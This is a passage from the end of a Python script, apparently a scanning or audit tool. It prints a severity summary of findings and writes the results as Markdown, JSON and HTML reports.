    if HAS_RICH:
        console.rule("[bold green]SUMMARY")
        console.print(f"  🔴 Critical:{s['critical']}  🟠 High:{s['high']}  🟡 Medium:{s['medium']}  🔵 Low:{s['low']}  ✅ Passed:{s['passed']}")
    else:
        print(f"\nSUMMARY: Critical={s['critical']} High={s['high']} Medium={s['medium']} Low={s['low']} Passed={s['passed']}")

    generate_markdown(result, md_path)
    console.print(f"\n📄 Markdown: {md_path}")
    if args.json:
        generate_json(result, jp)
        console.print(f"📄 JSON    : {jp}")
    if args.html:
        hp = out_dir / f"{stem}.html"
        generate_html(result, hp)
        console.print(f"📄 HTML    : {hp}")

    close_client()

if __name__ == "__main__":
    try:
        main()
    finally:
        close_client()
